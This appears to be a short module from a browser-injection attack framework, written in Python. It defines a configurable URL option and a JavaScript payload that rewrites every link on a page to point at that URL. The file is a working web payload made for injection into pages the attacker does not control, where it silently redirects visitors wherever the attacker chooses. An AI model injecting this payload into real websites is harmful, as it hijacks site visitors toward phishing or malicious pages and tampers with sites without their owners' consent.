#!/usr/bin/python3.7
name="link_replace"
description="Replaces all links on page"
options = [['URL', "URL to replace the links with", "http://example.com"]]

payload = """
Array.from(document.getElementsByTagName("a")).forEach(function(i) {
  i.href = "URL";
});
"""

